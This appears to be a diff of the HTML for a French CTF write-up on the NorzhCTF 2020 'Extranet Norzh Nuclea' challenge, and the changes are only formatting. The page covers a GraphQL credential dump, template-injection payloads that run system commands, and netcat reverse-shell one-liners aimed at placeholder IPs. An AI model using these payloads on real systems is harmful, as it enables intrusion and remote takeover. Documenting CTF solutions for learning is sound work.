@@ -17,7 +17,7 @@
 <meta name="twitter:title" content="Norzh CTF 2020 - Extranet Norzh Nuclea"/>
 <meta name="twitter:description" content="En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l&rsquo;ENSIBS. Cette année je ne faisais pas partie des &ldquo;créateurs de challenges&rdquo; mais bien des participants avec mes amis Haax, Razaborg et L0n3w0lf.
 Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : Extranet Norzh Nuclea que vous pouvez retrouver sur le git du NorzhCTF.
-Énoncé On commence par lire l&#39;énoncé
+Énoncé On commence par lire l&rsquo;énoncé
  Vous avez trouvé l&rsquo;extranet de l&rsquo;entreprise."/>
 <script type="application/ld+json">
     {
@@ -33,7 +33,7 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
                 "width":  800 ,
                 "height":  600 
             },"genre": "posts","wordcount":  2134 ,
-        "url": "\/2020\/02\/nuclea-web-extranet\/","datePublished": "2020-02-06T12:07:30\x2b01:00","dateModified": "2020-02-06T12:07:30\x2b01:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+        "url": "\/2020\/02\/nuclea-web-extranet\/","datePublished": "2020-02-06T12:07:30\u002b01:00","dateModified": "2020-02-06T12:07:30\u002b01:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
                 "@type": "Organization",
                 "name": "Driikolu",
                 "logo": {
@@ -80,7 +80,7 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
         </div><div class="post-content"><p>En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l&rsquo;ENSIBS. Cette année je ne faisais pas partie des &ldquo;créateurs de challenges&rdquo; mais bien des participants avec mes amis <a href="https://twitter.com/Haaxmax" target="_blank">Haax</a>, <a href="https://twitter.com/razaborg" target="_blank">Razaborg</a> et <a href="https://twitter.com/AzrakelK" target="_blank">L0n3w0lf</a>.</p>
 <p>Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : <strong>Extranet Norzh Nuclea</strong> que vous pouvez retrouver sur <a href="https://gitlab.com/norzhctf/norzhctf-2020" target="_blank">le git du NorzhCTF</a>.</p>
 <h1 id="énoncé">Énoncé</h1>
-<p>On commence par lire l'énoncé</p>
+<p>On commence par lire l&rsquo;énoncé</p>
 <blockquote>
 <p>Vous avez trouvé l&rsquo;extranet de l&rsquo;entreprise.</p>
 <p>Ce challenge se décompose en 4 parties :</p>
@@ -114,10 +114,10 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">decode_hex</span><span class="p">(</span><span class="nb">hex</span><span class="p">)</span><span class="p">:</span>
-    <span class="k">return</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="nb">hex</span><span class="p">)</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="p">]</span><span class="p">)</span>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">decode_hex</span><span class="p">(</span><span class="nb">hex</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="nb">hex</span><span class="p">),</span><span class="mi">2</span><span class="p">)])</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">decode_hex</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">2f6772617068716c3f71756572793d7175657279207b626c6f67706f7374285f69643a2235646632363961323338356538393838356265636234356222297b5f6964207469746c6520636f6e74656e747d7d</span><span class="s2">&#34;</span><span class="p">)</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">decode_hex</span><span class="p">(</span><span class="s2">&#34;2f6772617068716c3f71756572793d7175657279207b626c6f67706f7374285f69643a2235646632363961323338356538393838356265636234356222297b5f6964207469746c6520636f6e74656e747d7d&#34;</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Et on obtient le résultat suivant :</p>
@@ -136,8 +136,8 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16encode</span>
-<span class="k">def</span> <span class="nf">encode_hex</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span><span class="p">:</span>
-    <span class="k">return</span> <span class="n">b16encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="s1">/graphql?query=query </span><span class="s1">&#39;</span><span class="o">+</span><span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="p">)</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="p">)</span> <span class="c1">#encode() et decode() pour gérer les byte-strings</span>
+<span class="k">def</span> <span class="nf">encode_hex</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">b16encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/graphql?query=query &#39;</span><span class="o">+</span><span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="c1">#encode() et decode() pour gérer les byte-strings</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>La première étape pour obtenir le contenu de la base de données, c&rsquo;est d&rsquo;avoir toutes les tables présentes. En GrapQL ça s&rsquo;obtient avec la requête</p>
@@ -217,7 +217,7 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 </span><span class="w">				</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;String&#34;</span><span class="p">,</span><span class="w">
 </span><span class="w">				</span><span class="s">&#34;kind&#34;</span><span class="p">:</span><span class="s">&#34;SCALAR&#34;</span><span class="w">
 </span><span class="w">				</span><span class="p">}</span><span class="w">
-</span><span class="w">			</span><span class="p">}</span><span class="p">,</span><span class="w">
+</span><span class="w">			</span><span class="p">},</span><span class="w">
 </span><span class="w">			</span><span class="p">{</span><span class="w">
 </span><span class="w">			</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;username&#34;</span><span class="p">,</span><span class="w">
 </span><span class="w">			</span><span class="s">&#34;type&#34;</span><span class="p">:</span><span class="w">
@@ -225,7 +225,7 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 </span><span class="w">				</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;String&#34;</span><span class="p">,</span><span class="w">
 </span><span class="w">				</span><span class="s">&#34;kind&#34;</span><span class="p">:</span><span class="s">&#34;SCALAR&#34;</span><span class="w">
 </span><span class="w">				</span><span class="p">}</span><span class="w">
-</span><span class="w">			</span><span class="p">}</span><span class="p">,</span><span class="w">
+</span><span class="w">			</span><span class="p">},</span><span class="w">
 </span><span class="w">			</span><span class="p">{</span><span class="w">
 </span><span class="w">			</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;password&#34;</span><span class="p">,</span><span class="w">
 </span><span class="w">			</span><span class="s">&#34;type&#34;</span><span class="p">:</span><span class="w">
@@ -284,16 +284,16 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 </span><span class="w">	</span><span class="p">{</span><span class="w">
 </span><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;michelle&#34;</span><span class="p">,</span><span class="w">
 </span><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;Michelle1234&amp;__&#34;</span><span class="w">
-</span><span class="w">	</span><span class="p">}</span><span class="p">,</span><span class="w">
+</span><span class="w">	</span><span class="p">},</span><span class="w">
 </span><span class="w">	</span><span class="p">{</span><span class="w">
 </span><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;bernard&#34;</span><span class="p">,</span><span class="w">
 </span><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;youki1963&#34;</span><span class="w">
-</span><span class="w">	</span><span class="p">}</span><span class="p">,</span><span class="w">
+</span><span class="w">	</span><span class="p">},</span><span class="w">
 </span><span class="w">	</span><span class="p">{</span><span class="w">
 </span><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;administrateur&#34;</span><span class="p">,</span><span class="w">
 </span><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;ENSIBS{WOW_Such_Big_Credentials}&#34;</span><span class="w">
 </span><span class="w">	</span><span class="p">}</span><span class="w">
-</span><span class="w"></span><span class="p">]</span><span class="p">}</span><span class="w">
+</span><span class="w"></span><span class="p">]}</span><span class="w">
 </span></code></pre></td></tr></table>
 </div>
 </div><p>On a donc notre premier flag, et de quoi se connecter avec le compte administrateur.</p>
@@ -308,7 +308,7 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="p">{</span> <span class="p">[</span><span class="p">]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">(</span><span class="p">)</span><span class="p">[</span><span class="mi">92</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">sys</span><span class="s1">&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">os</span><span class="s1">&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">id -a</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="p">)</span> <span class="p">}</span><span class="p">}</span>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{{</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">92</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;id -a&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="p">}}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Mais étrangement le bouton ajouter ne fonctionne pas&hellip;</p>
@@ -348,9 +348,9 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 </span><span class="lnt">31
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">)</span><span class="p">.</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="p">)</span><span class="p">{</span>
-        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#submit&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="p">{</span>
-          <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">(</span><span class="p">)</span>
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#submit&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
+          <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">()</span>
 
           <span class="kd">var</span> <span class="nx">settings</span> <span class="o">=</span> <span class="p">{</span>
             <span class="s2">&#34;async&#34;</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
@@ -358,30 +358,30 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
             <span class="s2">&#34;method&#34;</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
             <span class="s2">&#34;headers&#34;</span><span class="o">:</span> <span class="p">{</span>
               <span class="s2">&#34;content-type&#34;</span><span class="o">:</span> <span class="s2">&#34;application/json&#34;</span>
-            <span class="p">}</span><span class="p">,</span>
+            <span class="p">},</span>
             <span class="s2">&#34;processData&#34;</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
-            <span class="s2">&#34;data&#34;</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="p">{</span>
-              <span class="nx">title</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="p">)</span><span class="p">,</span>
-              <span class="nx">content</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="p">)</span>
-            <span class="p">}</span><span class="p">)</span>
+            <span class="s2">&#34;data&#34;</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+              <span class="nx">title</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(),</span>
+              <span class="nx">content</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span>
+            <span class="p">})</span>
           <span class="p">}</span>
 
           <span class="c1">// Send data
-</span><span class="c1"></span>          <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="nx">settings</span><span class="p">)</span><span class="p">.</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">if</span><span class="p">(</span><span class="nx">response</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span><span class="p">{</span>
+</span><span class="c1"></span>          <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="nx">settings</span><span class="p">).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">response</span> <span class="o">===</span> <span class="kc">true</span><span class="p">){</span>
               <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Succesfully added blogpost&#39;</span><span class="p">)</span>             
-              <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-              <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+              <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+              <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
               <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Something went bad ...&#39;</span><span class="p">)</span>
             <span class="p">}</span>
-          <span class="p">}</span><span class="p">)</span>
+          <span class="p">})</span>
         
-      <span class="p">}</span><span class="p">)</span>
-    <span class="p">}</span><span class="p">)</span>
+      <span class="p">})</span>
+    <span class="p">})</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>Étrangement, on ne rentrait même pas dans le <em>else</em> du test après l&rsquo;envoi de la requête. C'était donc une erreur non prévue par le serveur&hellip; L&rsquo;injection de template n'était donc probablement pas en python.</p>
+</div><p>Étrangement, on ne rentrait même pas dans le <em>else</em> du test après l&rsquo;envoi de la requête. C&rsquo;était donc une erreur non prévue par le serveur&hellip; L&rsquo;injection de template n&rsquo;était donc probablement pas en python.</p>
 <p>On essaie d&rsquo;injecter des mots clefs de langages, comme du node.js.</p>
 <p>En envoyant un <strong>{ this }</strong>, le blogpost se créé, on va donc voir son contenu.</p>
 <p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_injected_post.png" alt="Blogpost avec injection" class="lazyload"><figcaption class="image-caption">Blogpost avec injection</figcaption></figure></p>
@@ -392,7 +392,7 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;&lt;CMD&gt;&#39;</span><span class="p">)</span> <span class="p">}</span>
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;&lt;CMD&gt;&#39;</span><span class="p">)</span> <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Mais à chaque fois j&rsquo;obtient le résultat <strong>[object Object]</strong>.</p>
@@ -411,7 +411,7 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/sh &lt;IP&gt; &lt;PORT&gt;&#39;</span><span class="p">)</span><span class="p">)</span> <span class="p">}</span>
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/sh &lt;IP&gt; &lt;PORT&gt;&#39;</span><span class="p">))</span> <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Malheureusement, ça ne fonctionne pas. Il n&rsquo;y a probablement pas la bonne version de netcat pour ça. Mais pas d&rsquo;inquiétude, on utilise une autre payload qui fonctionne à (presque) tous les coups :</p>
@@ -420,7 +420,7 @@ Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : 
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#39;</span><span class="p">)</span><span class="p">)</span> <span class="p">}</span>
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#39;</span><span class="p">))</span> <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Et on obtient bien un accès sur notre listener.</p>
@@ -462,7 +462,7 @@ cat flag
 	ENSIBS<span class="o">{</span>Web-ServerUserFlagHereBroooo<span class="o">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>Parfait, passons à l'étape 3.</p>
+</div><p>Parfait, passons à l&rsquo;étape 3.</p>
 <h1 id="obtenir-un-shell-root">Obtenir un shell root</h1>
 <p>Déjà, le premier reflexe est de voir ce qu&rsquo;on peut executer avec sudo.</p>
 <p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_sudo.jpg" alt="Retour de sudo -l" class="lazyload"><figcaption class="image-caption">Retour de sudo -l</figcaption></figure></p>
@@ -530,47 +530,47 @@ cat flag
 <span class="p">}</span>
 
 <span class="kr">const</span> <span class="nx">check_credentials</span> <span class="o">=</span> <span class="p">(</span><span class="nx">user</span><span class="p">,</span><span class="nx">password</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="kr">const</span> <span class="nx">process</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;/healthcheck/authent.sh&#39;</span><span class="p">,</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">password</span> <span class="p">]</span><span class="p">)</span>
-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
+    <span class="kr">const</span> <span class="nx">process</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,[</span><span class="s1">&#39;/healthcheck/authent.sh&#39;</span><span class="p">,</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">password</span> <span class="p">])</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">))</span>
     <span class="k">return</span> <span class="nb">String</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;True&#39;</span>
 <span class="p">}</span>
 
-<span class="kr">const</span> <span class="nx">basic_auth</span> <span class="o">=</span> <span class="nx">express_basic_auth</span><span class="p">(</span><span class="p">{</span>
+<span class="kr">const</span> <span class="nx">basic_auth</span> <span class="o">=</span> <span class="nx">express_basic_auth</span><span class="p">({</span>
     <span class="nx">authorizer</span> <span class="o">:</span> <span class="nx">check_credentials</span><span class="p">,</span>
     <span class="nx">unauthorizedResponse</span><span class="o">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
         <span class="k">return</span> <span class="nx">req</span><span class="p">.</span><span class="nx">auth</span>
         <span class="o">?</span> <span class="p">(</span><span class="s1">&#39;Credentials &#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">auth</span><span class="p">.</span><span class="nx">user</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="s2">&#34;**********&#34;</span> <span class="o">+</span> <span class="s1">&#39; rejected&#39;</span><span class="p">)</span>
         <span class="o">:</span> <span class="s1">&#39;No credentials provided&#39;</span>
     <span class="p">}</span>
-<span class="p">}</span><span class="p">)</span>
+<span class="p">})</span>
 
-<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">(</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
 <span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">basic_auth</span><span class="p">)</span>
 
 
 <span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/ping&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
     <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;up&#34;</span><span class="p">)</span>
-<span class="p">}</span><span class="p">)</span>
+<span class="p">})</span>
 
 <span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/health&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/ps&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;-auxfw&#39;</span><span class="p">]</span><span class="p">)</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
-<span class="p">}</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/ps&#39;</span><span class="p">,[</span><span class="s1">&#39;-auxfw&#39;</span><span class="p">]).</span><span class="nx">stdout</span><span class="p">))</span>
+<span class="p">})</span>
 
 <span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/disk-usage&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/df&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span><span class="p">)</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
-<span class="p">}</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/df&#39;</span><span class="p">,[</span><span class="s1">&#39;-h&#39;</span><span class="p">]).</span><span class="nx">stdout</span><span class="p">))</span>
+<span class="p">})</span>
 
 <span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/web-logs&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;/var/log/httpd/error_log&#39;</span><span class="p">]</span><span class="p">)</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
-<span class="p">}</span><span class="p">)</span>
